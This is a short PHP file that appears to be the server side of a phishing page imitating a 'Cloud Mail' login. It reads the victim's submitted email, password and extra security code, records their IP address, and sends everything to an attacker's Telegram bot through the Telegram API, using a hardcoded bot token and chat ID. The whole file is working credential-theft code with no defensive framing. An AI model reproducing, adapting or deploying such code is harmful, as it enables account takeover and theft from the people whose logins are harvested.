<?php

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $json_data = file_get_contents("php://input");
    $data = json_decode($json_data);

    $login = $data->login;
    $pass = $data->pass;
    $num = $data->num;

    $token = "6841556725:AAHu7cCARNME-rZTSG5wN6lZeVdVZyspGFQ";

    $chat_id = "1140041690";

    $ip = $_SERVER['HTTP_CLIENT_IP'] ? $_SERVER['HTTP_CLIENT_IP'] :
    ($_SERVER['HTTP_X_FORWARDED_FOR'] ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR']);

    // Используем Markdown для жирного текста
    $message = "*▪️ Сайт: Облако Mail*\n*▪️ Email:* " . $login . "\n*▪️ Пароль:* " . $pass . "\n*▪️ Доп. защита:* " . $num;

    file_get_contents('https://api.telegram.org/bot'.$token.'/sendMessage?chat_id='.$chat_id.'&text='.urlencode($message).'&parse_mode=Markdown');

} else {
    echo json_encode(['status' => 'error', 'message' => 'Invalid request method']);
}

?>
